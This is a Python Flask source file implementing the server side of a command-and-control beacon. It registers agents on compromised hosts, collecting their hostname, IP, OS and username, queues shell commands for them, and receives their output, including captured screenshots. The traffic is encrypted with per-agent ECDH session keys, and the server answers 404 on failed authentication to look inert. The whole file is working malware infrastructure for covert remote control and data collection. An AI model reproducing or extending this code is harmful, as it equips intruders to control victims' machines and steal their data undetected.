"""
Beacon routes — agent registration, task delivery, result collection.

Security model (applied in order during a typical agent session):

  1. /beacon/register  — validated with global C2_API_KEY (bootstrap token).
     Performs ECDH key agreement: both sides derive a unique 32-byte AES session
     key via HKDF-SHA256. Server issues a per-agent bearer token.

  2. /beacon/task      — validated with the per-agent session token.
     Payload encrypted/decrypted with the agent's unique session key.

  3. /beacon/result    — same as task, per-agent token + session key.

Capturing one agent's traffic reveals only that agent's session key.
All other agents are unaffected (forward secrecy per session).
"""

import secrets as _secrets
from functools import wraps
from datetime import datetime

from flask import Blueprint, request, jsonify, current_app, Response, g
from database import db, Agent, Task, Result, EventLog
from crypto import encrypt_json, decrypt_json, generate_ecdh_keypair, derive_session_key
from extensions import limiter

agent_bp = Blueprint('agent', __name__, url_prefix='/beacon')


# ── Auth decorators ────────────────────────────────────────────────────────────

def require_token(f):
    """Bootstrap guard: validates the global C2_API_KEY. Used for /register only."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.headers.get('X-Beacon-Token') != current_app.config['API_KEY']:
            return jsonify({'error': 'Not Found'}), 404
        return f(*args, **kwargs)
    return decorated


def require_agent_token(f):
    """
    Per-agent session token guard. Validates the unique token issued during
    ECDH registration. Also caches the Agent object in flask.g for use in the route.
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        agent_id = request.headers.get('X-Agent-ID')
        token    = request.headers.get('X-Beacon-Token')
        if not agent_id or not token:
            return jsonify({'error': 'Not Found'}), 404
        agent = db.session.get(Agent, agent_id)
        if not agent or not agent.session_token or agent.session_token != token:
            return jsonify({'error': 'Not Found'}), 404
        g.agent = agent  # cache — routes use g.agent instead of a second query
        return f(*args, **kwargs)
    return decorated


# ── Encryption helpers ─────────────────────────────────────────────────────────

def _decrypt_body(agent_key: str = None) -> dict:
    """
    Decrypt request body. Uses agent_key (session key) if provided,
    else falls back to global ENCRYPTION_KEY (bootstrap, for /register).
    """
    key = agent_key or current_app.config['ENCRYPTION_KEY']
    if current_app.config.get('ENCRYPT_BEACON'):
        raw = request.get_data(as_text=True).strip()
        return decrypt_json(raw, key)
    return request.get_json() or {}


def _encrypt_resp(data: dict, agent_key: str = None):
    """
    Encrypt response. Uses agent_key (session key) if provided,
    else falls back to global ENCRYPTION_KEY (bootstrap, for /register response).
    """
    key = agent_key or current_app.config['ENCRYPTION_KEY']
    if current_app.config.get('ENCRYPT_BEACON'):
        token = encrypt_json(data, key)
        return Response(token, content_type='text/plain')
    return jsonify(data)


def _log(event_type: str, agent_id: str = None, hostname: str = None, desc: str = ''):
    ev = EventLog(event_type=event_type, agent_id=agent_id,
                  agent_hostname=hostname, description=desc)
    db.session.add(ev)


# ── Routes ─────────────────────────────────────────────────────────────────────

@agent_bp.route('/register', methods=['POST'])
@limiter.limit("10 per minute")
@require_token
def register():
    """
    ECDH registration handshake:
      1. Decrypt payload with bootstrap key.
      2. Extract agent's ECDH public key from payload.
      3. Generate server ECDH keypair, derive shared session key.
      4. Issue per-agent session token.
      5. Return server ECDH public key + session token, encrypted with bootstrap key.
    Both sides now hold the same session key — no key ever transmitted in plaintext.
    """
    data = _decrypt_body()  # bootstrap key

    agent_id      = data.get('agent_id')
    agent_pub_hex = data.get('ecdh_public_key')
    if not agent_id or not agent_pub_hex:
        return jsonify({'error': 'Not Found'}), 404

    # ECDH key agreement
    server_priv, server_pub_hex = generate_ecdh_keypair()
    session_key_hex = derive_session_key(server_priv, agent_pub_hex)
    new_token       = _secrets.token_hex(32)

    agent = db.session.get(Agent, agent_id)
    if agent:
        was_inactive        = agent.status == 'inactive'
        agent.last_seen     = datetime.utcnow()
        agent.status        = 'active'
        agent.ip            = data.get('ip',         agent.ip)
        agent.hostname      = data.get('hostname',   agent.hostname)
        agent.os_version    = data.get('os_version', agent.os_version)
        agent.username      = data.get('username',   agent.username)
        agent.session_key   = session_key_hex
        agent.session_token = new_token
        if was_inactive:
            _log('agent_connected', agent_id, agent.hostname,
                 f"Agent reconnected from {agent.ip}")
    else:
        agent = Agent(
            id=agent_id,
            hostname=data.get('hostname'),
            ip=data.get('ip'),
            os=data.get('os'),
            os_version=data.get('os_version'),
            username=data.get('username'),
            session_key=session_key_hex,
            session_token=new_token,
        )
        db.session.add(agent)
        _log('agent_connected', agent_id, data.get('hostname'),
             f"New agent from {data.get('ip')} ({data.get('os')}) "
             f"as {data.get('username')}")

    db.session.commit()

    # Response encrypted with bootstrap key — agent derives session_key from ecdh_public_key
    return _encrypt_resp({
        'status':         'registered',
        'agent_id':       agent_id,
        'ecdh_public_key': server_pub_hex,
        'session_token':   new_token,
    })


@agent_bp.route('/task', methods=['GET'])
@limiter.limit("120 per minute")
@require_agent_token
def get_task():
    """Deliver pending task to agent, encrypted with its unique session key."""
    agent = g.agent
    agent_id = agent.id

    was_inactive    = agent.status == 'inactive'
    agent.last_seen = datetime.utcnow()
    agent.status    = 'active'
    if was_inactive:
        _log('agent_connected', agent_id, agent.hostname, "Agent resumed beaconing")
    db.session.commit()

    task = (Task.query
            .filter_by(agent_id=agent_id, status='pending')
            .order_by(Task.created_at)
            .first())

    if task:
        task.status = 'delivered'
        db.session.commit()
        return _encrypt_resp(
            {'task_id': task.id, 'command': task.command},
            agent_key=agent.session_key,
        )

    return _encrypt_resp({'task_id': None, 'command': None}, agent_key=agent.session_key)


@agent_bp.route('/result', methods=['POST'])
@limiter.limit("120 per minute")
@require_agent_token
def post_result():
    """Receive command output from agent, encrypted with its session key."""
    agent    = g.agent
    agent_id = agent.id
    data     = _decrypt_body(agent_key=agent.session_key)
    task_id  = data.get('task_id')
    output   = data.get('output', '')

    task = db.session.get(Task, task_id)
    if task:
        task.status = 'completed'

    # Tag output type so screenshot gallery can filter without a LIKE on ciphertext
    output_type = 'screenshot' if output.startswith('[SCREENSHOT_B64]') else 'text'
    result = Result(
        task_id=task_id,
        agent_id=agent_id,
        output=output,
        output_type=output_type,
    )
    db.session.add(result)

    cmd      = task.command if task else '?'
    hostname = agent.hostname if agent else agent_id
    _log('task_completed', agent_id, hostname, f'Command: {cmd[:80]}')

    db.session.commit()
    return _encrypt_resp({'status': 'received'}, agent_key=agent.session_key)
